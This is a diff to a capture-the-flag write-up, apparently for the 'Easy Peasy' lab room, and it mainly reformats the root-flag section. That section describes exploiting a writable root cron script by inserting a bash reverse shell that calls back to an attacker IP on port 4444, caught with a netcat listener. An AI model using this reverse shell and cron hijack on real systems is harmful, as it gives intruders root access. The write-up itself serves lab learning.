@@ -106,11 +106,14 @@ The flag is rotated, take it to CyberChef and apply ROT13.
 ![14.png](/assets/img/writeups/easy-peasy/14.png)
 
 **Q8**: What is the root flag?<br>
-Checked sudo using `sudo -l`, and the result showed that `boring` is not allowed to run sudo.<br>Checked cron using `cat /etc/crontab` and found the following entry:<br>`* * * * * root cd /var/www/ && sudo bash .mysecretcronjob.sh`<br>
-This indicates that the cron job will be executed shortly.<br>In `/var/www/`, a writable file `.mysecretcronjob.sh` was found.<br>Edited `.mysecretcronjob.sh` to include a reverse shell payload:
+Checked sudo using `sudo -l`, and the result showed that `boring` is not allowed to run sudo.<br>Checked cron using `cat /etc/crontab` and found the following entry:
+````
+* * * * * root cd /var/www/ && sudo bash .mysecretcronjob.sh
+````
+This indicates that the cron job will be executed shortly.In `/var/www/`, a writable file `.mysecretcronjob.sh` was found.<br>Edited `.mysecretcronjob.sh` to include a reverse shell payload:
 ````
 #!/bin/bash
 bash -i >& /dev/tcp/10.11.119.55/4444 0>&1
 ````
 
-Started a listener on your machine using nc `-lvnp 4444`.<br>The flag file is hidden, so navigate to `/root`, run `ls -la` to reveal it, and then use `cat .root.txt` to view the flag.
+Started a listener using nc `-lvnp 4444`.<br>The flag file is hidden, so navigate to `/root`, ran `ls -la` to reveal it, and then use `cat .root.txt` to retrieve the flag.
